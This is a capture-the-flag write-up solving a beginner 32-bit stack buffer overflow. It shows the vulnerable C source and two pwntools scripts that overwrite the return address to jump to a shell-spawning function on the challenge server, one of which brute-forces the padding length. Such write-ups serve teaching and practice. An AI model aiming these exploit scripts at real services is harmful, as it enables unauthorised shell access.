## Baby Buffer Overflow - 32bit
Given the name, this will be a buffer overflow binary exploitation. So given the download of a binary and the c source code (**do not** compile it), lets take a look at the source.
```c
void target(){
    puts("Jackpot!");
    char* executable="/bin/bash"; // Invokes a shell
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}
int vuln(){
    char buf[16]; // 16 byte buffer is exploitable
    gets(buf);
    return 0;
}
```
Since there are no protections on this binary, we can simply run this command to get memory address of the target() function. Ghidra or IDA will also work.
```sh
objdump -d babybufov | grep "target"  
080491f5 <target>:
```
So we need to overwrite the buffer and slide into that function address (hex = 0x080491f5)
It is nice of them to print "Jackpot!" as it makes for an easier time finding your padding.
Originally I did the method creating a pattern of known length, and finding where it broke the binary, arriving at 28 bytes. But I also decided to have fun and practice my pwntools skills by making an autopwner for this challenge. Probably can tweak it for other things. Anyways here's both, just one is quick and the other is more fun.

**Option 1** : You calculated the padding and send one payload
```python
from pwn import *
# change port
p = remote('challenge.ctf.games', PORT)

payload = b"A" * 28
payload += p32(0x080491f5) 

p.sendline(payload)
p.interactive()
```

**OPTION 2** : We know target address but want to autopwn padding remotely with nice logs
```python
from pwn import *

TARGET_ADDRESS = 0x080491f5  	# Target memory address
PORT = 32565                 	# Remote server port
HOST = 'challenge.ctf.games' 	# Remote server host
MAX_PADDING = 50             	# Maximum padding to 

GREEN = "\033[92m"
RESET = "\033[0m"
context.log_level = 'error'

def autopwn(target_address, port, max_padding):
    print(f"URL: {HOST}:{port}\nTarget Address: {hex(target_address)}")
    padding = 16

    while padding <= max_padding:
        try:
            payload = b"A" * padding + p32(target_address)
            print(f"Attempting Padding size: {padding}", end="\r")

            p = remote(HOST, port)
            p.sendline(payload)
            response = b""
            try:
                while True:
                    part = p.recv(timeout=5)
                    if not part: break
                    response += part
            except EOFError:
                pass

            if response and (b"$" in response or b"#" in response or b"Jackpot!" in response):
                print(f"{GREEN}Attempting Padding size: {padding} - Success!{RESET}")
                p.interactive()
                break
        except EOFError:
            print(f"Padding size {padding} - Disconnected.", end="\r")
        except Exception as e:
            print(f"[ERROR] {e}")
        finally:
            p.close()
        padding += 1

autopwn(TARGET_ADDRESS, PORT, MAX_PADDING)
```
